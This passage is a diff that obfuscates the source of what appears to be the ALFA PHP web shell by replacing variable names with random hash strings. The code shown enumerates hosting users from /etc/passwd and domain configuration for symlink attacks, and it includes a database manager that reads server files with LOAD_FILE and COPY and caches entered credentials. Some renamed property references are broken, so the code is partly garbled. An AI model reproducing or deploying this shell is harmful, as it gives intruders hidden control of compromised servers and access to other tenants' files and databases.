+			$lpndcjtf109633366fd0d46d371ede589998abaa = str_replace("{user}", trim($syosrpmxd4a590caacc0be55ef286e40a945ea45[1]), $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353++, trim($syosrpmxd4a590caacc0be55ef286e40a945ea45[1]), trim($syosrpmxd4a590caacc0be55ef286e40a945ea45[0]), $lpndcjtf109633366fd0d46d371ede589998abaa), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
 		}
 	}
 }else{
-	$passwd = _alfa_file("/etc/passwd");
-	if($passwd){
-		$html = "";
-		$is_named = false;
-		$users = array();
-		$domains = array();
-		$uknowns = array();
-		foreach($passwd as $user){
-			$user = trim($user);
-			$expl = explode(":", $user);
-			if((int)$expl[2] < 500)continue;
-			$users[$expl[0]] = $expl[5];
+	$hkzphjmk76a2173be6393254e72ffa4d6df1030a = _alfa_file("/etc/passwd");
+	if($hkzphjmk76a2173be6393254e72ffa4d6df1030a){
+		$ganhkkwefc35fdc70d5fc69d269883a822c7a53e = "";
+		$vbptyrplf740e0e2c6fe160ae7d27904d6f6d545 = false;
+		$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = array();
+		$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3 = array();
+		$hquclxobbf653f763917e644ce9567f8e270ac61 = array();
+		foreach($hkzphjmk76a2173be6393254e72ffa4d6df1030a as $eeodyzriee11cbb19052e40b07aac0ca060c23ee){
+			$eeodyzriee11cbb19052e40b07aac0ca060c23ee = trim($eeodyzriee11cbb19052e40b07aac0ca060c23ee);
+			$tabjyczfdc653fc0484527ae99855fdd042b2747 = explode(":", $eeodyzriee11cbb19052e40b07aac0ca060c23ee);
+			if((int)$tabjyczfdc653fc0484527ae99855fdd042b2747[2] < 500)continue;
+			$qbyndzxd9bc65c2abec141778ffaa729489f3e87[$tabjyczfdc653fc0484527ae99855fdd042b2747[0]] = $tabjyczfdc653fc0484527ae99855fdd042b2747[5];
 		}
-		$site_domains = @scandir("/etc/virtual/");
-		if(!$site_domains){
-			$site_domains = alfaEx("ls /etc/virtual/");
-			$site_domains = explode("\n", $site_domains);
-			if(!$site_domains){
-				$site_domains = _alfa_file("/etc/named.conf");
-				if($site_domains){$is_named = true;}
+		$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = @scandir("/etc/virtual/");
+		if(!$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f){
+			$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = alfaEx("ls /etc/virtual/");
+			$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = explode("\n", $phihcrzubafbc03c59c9ba86744e95d3e9d21f6f);
+			if(!$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f){
+				$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = _alfa_file("/etc/named.conf");
+				if($phihcrzubafbc03c59c9ba86744e95d3e9d21f6f){$vbptyrplf740e0e2c6fe160ae7d27904d6f6d545 = true;}
 			}
 		}
-		foreach($site_domains as $line){
-			if($is_named){
-				if(@strstr($line, 'zone')){
-					preg_match_all('#zone "(.*)"#',$line, $data);
-					$domain = $data[1][0];
-					if(strlen($domain  > 2) && !empty($domain)){
-						$domains[] = $domain;
+		foreach($phihcrzubafbc03c59c9ba86744e95d3e9d21f6f as $yeshcnjz6438c669e0d0de98e6929c2cc0fac474){
+			if($vbptyrplf740e0e2c6fe160ae7d27904d6f6d545){
+				if(@strstr($yeshcnjz6438c669e0d0de98e6929c2cc0fac474, 'zone')){
+					preg_match_all('#zone "(.*)"#',$yeshcnjz6438c669e0d0de98e6929c2cc0fac474, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
+					$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $sfmsaibm8d777f385d3dfec8815d20f7496026dc[1][0];
+					if(strlen($qbjarsosad5f82e879a9c5d6b5b442eb37e50551  > 2) && !empty($qbjarsosad5f82e879a9c5d6b5b442eb37e50551)){
+						$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3[] = $qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
 					}
 				}
 			}else{
-				$domains[] = $line;
+				$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3[] = $yeshcnjz6438c669e0d0de98e6929c2cc0fac474;
 			}
 		}
-		$x = 1;
-		foreach($users as $user => $home){
-			foreach($domains as $domain){
-				$user_len = strlen($user) - 1;
-				$sub_domain = str_replace(array("-","."), "", $domain);
-				$five_user = substr($user, 0,$user_len);
-				$five_domain = substr($sub_domain, 0,$user_len);
-				if($five_user == $five_domain){
-					if($is_direct){
-						$cwd = str_replace("{user}", $user, $makepwd);
+		$fyyftmba9dd4e461268c8034f5c8564e155c67a6 = 1;
+		foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee => $qnrubnys106a6c241b8797f52e1e77317b96a201){
+			foreach($jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3 as $qbjarsosad5f82e879a9c5d6b5b442eb37e50551){
+				$cepprcnyde44140bd73233934b5d7a023119378b = strlen($eeodyzriee11cbb19052e40b07aac0ca060c23ee) - 1;
+				$awzpxgwq7564419312cfbd932f4bd36412e8d6aa = str_replace(array("-","."), "", $qbjarsosad5f82e879a9c5d6b5b442eb37e50551);
+				$zzkjsxfm9b729b7da9e8f6984a146f9177335c2e = substr($eeodyzriee11cbb19052e40b07aac0ca060c23ee, 0,$cepprcnyde44140bd73233934b5d7a023119378b);
+				$qmhunrrpa8f46b090c25418a74ca4be507e7c5ec = substr($awzpxgwq7564419312cfbd932f4bd36412e8d6aa, 0,$cepprcnyde44140bd73233934b5d7a023119378b);
+				if($zzkjsxfm9b729b7da9e8f6984a146f9177335c2e == $qmhunrrpa8f46b090c25418a74ca4be507e7c5ec){
+					if($ksmhyxred6ebdd1917aa6fd3aa4228decf56e704){
+						$lpndcjtf109633366fd0d46d371ede589998abaa = str_replace("{user}", $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
 					}else{
-						$expl = explode("}/", $makepwd);
-						$cwd = $home."/".$expl[1];
+						$tabjyczfdc653fc0484527ae99855fdd042b2747 = explode("}/", $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+						$lpndcjtf109633366fd0d46d371ede589998abaa = $qnrubnys106a6c241b8797f52e1e77317b96a201."/".$tabjyczfdc653fc0484527ae99855fdd042b2747[1];
 					}
-					$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, $domain, $cwd), $template);
+					$ganhkkwefc35fdc70d5fc69d269883a822c7a53e .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($fyyftmba9dd4e461268c8034f5c8564e155c67a6++, $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $lpndcjtf109633366fd0d46d371ede589998abaa), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
 				}else{
-					$uknowns[$user] = $home;
+					$hquclxobbf653f763917e644ce9567f8e270ac61[$eeodyzriee11cbb19052e40b07aac0ca060c23ee] = $qnrubnys106a6c241b8797f52e1e77317b96a201;
 				}
 			}
 		}
-		$uknowns = array_unique($uknowns);
-		foreach($uknowns as $user => $home){
-			if($is_direct){
-				$cwd = str_replace("{user}", $user, $makepwd);
+		$hquclxobbf653f763917e644ce9567f8e270ac61 = array_unique($hquclxobbf653f763917e644ce9567f8e270ac61);
+		foreach($hquclxobbf653f763917e644ce9567f8e270ac61 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee => $qnrubnys106a6c241b8797f52e1e77317b96a201){
+			if($ksmhyxred6ebdd1917aa6fd3aa4228decf56e704){
+				$lpndcjtf109633366fd0d46d371ede589998abaa = str_replace("{user}", $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
 			}else{
-				$expl = explode("}/", $makepwd);
-				$cwd = $home."/".$expl[1];
+				$tabjyczfdc653fc0484527ae99855fdd042b2747 = explode("}/", $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+				$lpndcjtf109633366fd0d46d371ede589998abaa = $qnrubnys106a6c241b8797f52e1e77317b96a201."/".$tabjyczfdc653fc0484527ae99855fdd042b2747[1];
 			}
-			$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, "[?????]", $cwd), $template);
+			$ganhkkwefc35fdc70d5fc69d269883a822c7a53e .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($fyyftmba9dd4e461268c8034f5c8564e155c67a6++, $eeodyzriee11cbb19052e40b07aac0ca060c23ee, "[?????]", $lpndcjtf109633366fd0d46d371ede589998abaa), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
 		}
-		echo($html);
+		echo($ganhkkwefc35fdc70d5fc69d269883a822c7a53e);
 	}
 }
 echo "</table>";
-$cant_symlink = false;
+$emqpgypucfee63abb9f61af226a0ed410bd27503 = false;
 }
 }else{
 	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
-	$cant_symlink = false;
+	$emqpgypucfee63abb9f61af226a0ed410bd27503 = false;
 }
-if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
+if($emqpgypucfee63abb9f61af226a0ed410bd27503)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
 echo "</center></table>";
 }
 echo "</div>";
@@ -4553,90 +4626,90 @@ alfafooter();
 }
 function alfasql(){
 class DbClass{
-public $type;
-public $link;
-public $res;
-public $mysqli_connect_error = false;
-public $mysqli_connect_error_msg = "";
-function __construct($type){
-$this->type = $type;
+public $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a;
+public $rsrmsacs2a304a1348456ccd2234cd71a81bd338;
+public $ybaqpbzt9b207167e5381c47682c6b4f58a623fb;
+public $pdheuxgqb026c6848a07a615c13ccdf3a034c682 = false;
+public $hnfqefqi6569392469f54940efeb8edfce526097 = "";
+function __construct($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a){
+$this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a = $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a;
 }
-function connect($host, $user, $pass, $dbname){
-switch($this->type){
+function connect($wlerpykf67b3dba8bc6778101892eb77249db32e, $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $niuecjcs1a1dc91c907325c69271ddf0c944bc72, $pghnyjea4cd4a49f25984e26fe708c1fbd896653){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-if($this->link = @mysqli_connect($host,$user,$pass,$dbname)){
+if($this->$vnahwpzo0a16bc32f55683128983f223de242942 = @mysqli_connect($wlerpykf67b3dba8bc6778101892eb77249db32e,$eeodyzriee11cbb19052e40b07aac0ca060c23ee,$niuecjcs1a1dc91c907325c69271ddf0c944bc72,$pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
 	return true;
 }else{
-	$this->mysqli_connect_error = true;
-	$this->mysqli_connect_error_msg = mysqli_connect_error();
+	$this->$cihfktile33d4f5439a6b8b730352a9ddd04b1b2 = true;
+	$this->$lbigkecwc00813dcbde065b7bb6dba1660a061ed = mysqli_connect_error();
 	return false;
 }
 break;
 case 'pgsql':
-$host = explode(':', $host);
-if(!$host[1]) $host[1]=5432;
-if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
+$wlerpykf67b3dba8bc6778101892eb77249db32e = explode(':', $wlerpykf67b3dba8bc6778101892eb77249db32e);
+if(!$wlerpykf67b3dba8bc6778101892eb77249db32e[1]) $wlerpykf67b3dba8bc6778101892eb77249db32e[1]=5432;
+if( $this->$vnahwpzo0a16bc32f55683128983f223de242942 = @pg_connect("host={$wlerpykf67b3dba8bc6778101892eb77249db32e[0]} port={$wlerpykf67b3dba8bc6778101892eb77249db32e[1]} user=$eeodyzriee11cbb19052e40b07aac0ca060c23ee password=$niuecjcs1a1dc91c907325c69271ddf0c944bc72 dbname=$pghnyjea4cd4a49f25984e26fe708c1fbd896653") ) return true;
 break;
 }
 return false;
 }
-function selectdb($db){
-switch($this->type){
+function selectdb($dhkkpmvsd77d5e503ad1439f585ac494268b351b){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-if(@mysqli_select_db($db))return true;
+if(@mysqli_select_db($dhkkpmvsd77d5e503ad1439f585ac494268b351b))return true;
 break;
 }
 return false;
 }
-function query($str){
-switch($this->type){
+function query($okjeiabf341be97d9aff90c9978347f66f945b77){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-return $this->res = @mysqli_query($this->link,$str);
+return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = @mysqli_query($this->$vnahwpzo0a16bc32f55683128983f223de242942,$okjeiabf341be97d9aff90c9978347f66f945b77);
 break;
 case 'pgsql':
-return $this->res = @pg_query($this->link,$str);
+return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = @pg_query($this->$vnahwpzo0a16bc32f55683128983f223de242942,$okjeiabf341be97d9aff90c9978347f66f945b77);
 break;
 }
 return false;
 }
 function fetch(){
-$res = func_num_args()?func_get_arg(0):$this->res;
-switch($this->type){
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = func_num_args()?func_get_arg(0):$this->$ovjcnuas12470fe406d44017d96eab37dd65fc14;
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-return @mysqli_fetch_assoc($res);
+return @mysqli_fetch_assoc($ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
 break;
 case 'pgsql':
-return @pg_fetch_assoc($res);
+return @pg_fetch_assoc($ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
 break;
 }
 return false;
 }
 function listDbs(){
-switch($this->type){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
 return $this->query("SHOW databases");
 break;
 case 'pgsql':
-return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
+return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
 break;
 }
 return false;
 }
 function listTables(){
-switch($this->type){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-return $this->res = $this->query('SHOW TABLES');
+return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = $this->query('SHOW TABLES');
 break;
 case 'pgsql':
-return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
+return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
 break;
 }
 return false;
 }
 function error(){
-switch($this->type){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-return @mysqli_error($this->link);
+return @mysqli_error($this->$vnahwpzo0a16bc32f55683128983f223de242942);
 break;
 case 'pgsql':
 return @pg_last_error();
@@ -4644,105 +4717,105 @@ break;
 }
 return false;
 }
-function setCharset($str){
-switch($this->type){
+function setCharset($okjeiabf341be97d9aff90c9978347f66f945b77){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
 if(function_exists('mysql_set_charset'))
-return @mysqli_set_charset($this->link,$str);
+return @mysqli_set_charset($this->$vnahwpzo0a16bc32f55683128983f223de242942,$okjeiabf341be97d9aff90c9978347f66f945b77);
 else
-$this->query('SET CHARSET '.$str);
+$this->query('SET CHARSET '.$okjeiabf341be97d9aff90c9978347f66f945b77);
 break;
 case 'pgsql':
-return @pg_set_client_encoding($this->link, $str);
+return @pg_set_client_encoding($this->$vnahwpzo0a16bc32f55683128983f223de242942, $okjeiabf341be97d9aff90c9978347f66f945b77);
 break;
 }
 return false;
 }
-function loadFile($str){
-switch($this->type){
+function loadFile($okjeiabf341be97d9aff90c9978347f66f945b77){
+switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
 case 'mysql':
-return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
+return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($okjeiabf341be97d9aff90c9978347f66f945b77)."') as file"));
 break;
 case 'pgsql':
-$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes($str)."';select file from solevisible;");
-$r=array();
-while($i=$this->fetch())
-$r[] = $i['file'];
+$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes($okjeiabf341be97d9aff90c9978347f66f945b77)."';select file from solevisible;");
+$yxarqqmp4b43b0aee35624cd95b910189b3dc231=array();
+while($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=$this->fetch())
+$yxarqqmp4b43b0aee35624cd95b910189b3dc231[] = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741['file'];
 $this->query('drop table solevisible');
-return array('file'=>implode("\n",$r));
+return array('file'=>implode("\n",$yxarqqmp4b43b0aee35624cd95b910189b3dc231));
 break;
 }
 return false;
 }
 };
-$db = new DbClass($_POST['type']);
+$dhkkpmvsd77d5e503ad1439f585ac494268b351b = new DbClass($_POST['type']);
 alfahead();
-$form_visibility = "table";
+$kkofmnwibd4e5fa0a792853ce7c23938d8d7454b = "table";
 if(isset($_POST['sql_host'])){
-	$connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
-	if($connection_db && !empty($_POST['sql_base'])){
-		$form_visibility = "none";
+	$ptdvxdqe1ef1093be8ab258c29c47cd73a908655 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+	if($ptdvxdqe1ef1093be8ab258c29c47cd73a908655 && !empty($_POST['sql_base'])){
+		$kkofmnwibd4e5fa0a792853ce7c23938d8d7454b = "none";
 	}
 }
-$database_list = array();
+$tpcabxrb70998fbda3b8e12bedce9c4eba825ea8 = array();
 echo "
-<div class='header' style='min-height:300px;'>".($form_visibility!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
-<div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($form_visibility=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
+<div class='header' style='min-height:300px;'>".($kkofmnwibd4e5fa0a792853ce7c23938d8d7454b!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
+<div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($kkofmnwibd4e5fa0a792853ce7c23938d8d7454b=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
 <td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
 <td><select name='type'><option value='mysql' selected>mysql</option></select></td>
 <td><input type='text' name='sql_host' id='db_host' value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
 <td><input type='text' name='sql_login' id='db_user' value='". (empty($_POST['sql_login'])?'':htmlspecialchars($_POST['sql_login'])) ."'></td>
 <td><input type='text' name='sql_pass' id='db_pw' value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
-$tmp = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars($_POST['sql_base'])) ."'>";
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars($_POST['sql_base'])) ."'>";
 if(isset($_POST['sql_host'])){
-if($connection_db){
-$db->setCharset('utf8');
-$db->listDbs();
+if($ptdvxdqe1ef1093be8ab258c29c47cd73a908655){
+$dhkkpmvsd77d5e503ad1439f585ac494268b351b->setCharset('utf8');
+$dhkkpmvsd77d5e503ad1439f585ac494268b351b->listDbs();
 echo "<select name=sql_base><option value=''></option>";
-while($item = $db->fetch()) {
-list($key, $value) = each($item);
-$database_list[] = $value;
-echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
+while($geklwdir447b7147e84be512208dcc0995d67ebc = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->fetch()) {
+list($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804) = each($geklwdir447b7147e84be512208dcc0995d67ebc);
+$tpcabxrb70998fbda3b8e12bedce9c4eba825ea8[] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+echo '<option value="'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'" '.($rkptsoeg2063c1608d6e0baf80249c42e2be5804==$_POST['sql_base']?'selected':'').'>'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'</option>';
 }
 echo '</select>';
 }else{
-	echo $tmp;
+	echo $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef;
 }
 }else
-echo $tmp;
-$curr_mysql_id = $_POST['current_mysql_id'];
+echo $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef;
+$vnqvheiic0316dfc8db23eee2c500b38d6c0f264 = $_POST['current_mysql_id'];
 echo "</td>
 <td><button onclick='fs(this);return false;' class='db-opt-id db-connect-btn'>Connect</button></td>
 <td><input type='checkbox' name='sql_count' value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <div class=\"txtfont\">count the number of rows</div></td>
 </tr>
 </table>";
-if($db->mysqli_connect_error){
-	echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">'.$db->mysqli_connect_error_msg.'</div>';
+if($dhkkpmvsd77d5e503ad1439f585ac494268b351b->$cihfktile33d4f5439a6b8b730352a9ddd04b1b2){
+	echo '<divstyle="text-align: center;font-size: 17px;margin-top: 18px;">'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b->$lbigkecwc00813dcbde065b7bb6dba1660a061ed.'</div>';
 }
-if(!empty($curr_mysql_id)){
-	$sql_title_db = "";
+if(!empty($vnqvheiic0316dfc8db23eee2c500b38d6c0f264)){
+	$tidgekoo684b1670b967545a4bf87cb5f988b774 = "";
 	if(!empty($_POST['sql_base'])){
-		$sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
+		$tidgekoo684b1670b967545a4bf87cb5f988b774 = "d.querySelector('#tab_".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264." span').innerHTML='".addslashes($_POST['sql_base'])."';";
 	}
-	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."alfaConnectionHistoryUpdate();</script>";
+	echo "<script>mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['count']='".addslashes($_POST['sql_count'])."';".$tidgekoo684b1670b967545a4bf87cb5f988b774."alfaConnectionHistoryUpdate();</script>";
 }
-if(isset($db) && $db->link){
+if(isset($dhkkpmvsd77d5e503ad1439f585ac494268b351b) && $dhkkpmvsd77d5e503ad1439f585ac494268b351b->$vnahwpzo0a16bc32f55683128983f223de242942){
 if(!empty($_POST['sql_base'])){
 echo "<div class='mysql-main'><div mode='block' onclick='alfaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='alfaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='alfaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
-foreach ($database_list as $db_name) {
-	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
-	if($db_name == $_POST['sql_base']){
-		$db->selectdb($_POST['sql_base']);
-		$tbls_res = $db->listTables();
-		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
-		while($item = $db->fetch($tbls_res)){
-		list($key, $value) = each($item);
+foreach ($tpcabxrb70998fbda3b8e12bedce9c4eba825ea8 as $nksstcaw24e8d17701309eab9a46949f1eab03b1) {
+	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($nksstcaw24e8d17701309eab9a46949f1eab03b1 == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'</span><div class="clearfloat"></div><div db_name="'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" mode="'.($nksstcaw24e8d17701309eab9a46949f1eab03b1 == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'"><div>';
+	if($nksstcaw24e8d17701309eab9a46949f1eab03b1 == $_POST['sql_base']){
+		$dhkkpmvsd77d5e503ad1439f585ac494268b351b->selectdb($_POST['sql_base']);
+		$alfzuvdy602d30e9c23d6740f73b1b6bad159ccd = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->listTables();
+		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
+		while($geklwdir447b7147e84be512208dcc0995d67ebc = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->fetch($alfzuvdy602d30e9c23d6740f73b1b6bad159ccd)){
+		list($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804) = each($geklwdir447b7147e84be512208dcc0995d67ebc);
 		if(!empty($_POST['sql_count']))
-		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
-		$value = htmlspecialchars($value);
